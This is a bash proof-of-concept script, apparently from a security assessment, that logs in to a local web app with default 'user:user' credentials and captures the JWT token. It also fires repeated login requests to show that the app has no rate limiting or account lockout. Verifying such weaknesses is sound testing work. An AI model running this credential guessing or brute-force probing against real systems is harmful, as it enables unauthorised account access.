#!/bin/bash

# POC: Weak Credential Policy - Default Test Credentials Accepted
# This script demonstrates that the application accepts weak credentials (user:user)
# without enforcing minimum password complexity or account lockout mechanisms

TARGET_URL="http://localhost:5003"
LOGIN_ENDPOINT="${TARGET_URL}/login"

echo "=========================================="
echo "POC: Weak Credential Policy Test"
echo "=========================================="
echo ""

# Test 1: Attempt login with weak credentials (user:user)
echo "[*] Test 1: Attempting login with weak credentials (user:user)..."
RESPONSE=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" \
  -i -L)

echo "Response:"
echo "$RESPONSE"
echo ""

# Check if login was successful (302 redirect or 200 with token)
if echo "$RESPONSE" | grep -q "token="; then
    echo "[✓] SUCCESS: Weak credentials (user:user) were accepted!"
    echo "[✓] JWT token was generated"
    TOKEN=$(echo "$RESPONSE" | grep -oP 'token=\K[^;]+' | head -1)
    if [ ! -z "$TOKEN" ]; then
        echo "[*] Token obtained: ${TOKEN:0:50}..."
    fi
elif echo "$RESPONSE" | grep -q "302\|Location:"; then
    echo "[✓] SUCCESS: Login redirect detected (302 Found)"
    echo "[✓] Weak credentials (user:user) were accepted!"
else
    echo "[-] Login may have failed. Full response:"
    echo "$RESPONSE"
fi

echo ""
echo "[*] Test 2: Checking for rate limiting (sending 10 rapid requests)..."
SUCCESS_COUNT=0
for i in {1..10}; do
    RESP=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=user&password=user" \
      -w "%{http_code}" -o /dev/null)
    
    if [ "$RESP" = "302" ] || [ "$RESP" = "200" ]; then
        ((SUCCESS_COUNT++))
    elif [ "$RESP" = "429" ]; then
        echo "[✓] Rate limiting detected (HTTP 429)"
        break
    fi
    echo "  Request $i: HTTP $RESP"
done

echo ""
if [ "$SUCCESS_COUNT" -ge 9 ]; then
    echo "[✓] NO RATE LIMITING: All 10 requests succeeded without throttling"
else
    echo "[-] Some requests were rate limited"
fi

echo ""
echo "[*] Test 3: Checking for account lockout (5 failed attempts with wrong password)..."
LOCKOUT_DETECTED=0
for i in {1..5}; do
    RESP=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=user&password=wrongpassword123" \
      -w "%{http_code}" -o /dev/null)
    
    echo "  Failed attempt $i: HTTP $RESP"
    if [ "$RESP" = "403" ] || [ "$RESP" = "429" ]; then
        echo "[✓] Account lockout detected"
        LOCKOUT_DETECTED=1
        break
    fi
done

if [ "$LOCKOUT_DETECTED" = "0" ]; then
    echo "[✓] NO ACCOUNT LOCKOUT: Account still active after 5 failed attempts"
fi

echo ""
echo "[*] Test 4: Verifying weak credentials are still valid after failed attempts..."
FINAL_RESP=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" \
  -w "%{http_code}" -o /dev/null)

if [ "$FINAL_RESP" = "302" ] || [ "$FINAL_RESP" = "200" ]; then
    echo "[✓] Weak credentials (user:user) still accepted after failed attempts"
else
    echo "[-] Login failed after attempts"
fi

echo ""
echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "[✓] Weak credentials (user:user) are accepted"
echo "[✓] No rate limiting on login endpoint"
echo "[✓] No account lockout mechanism after failed attempts"
echo "[✓] Application is vulnerable to brute force/dictionary attacks"
echo "=========================================="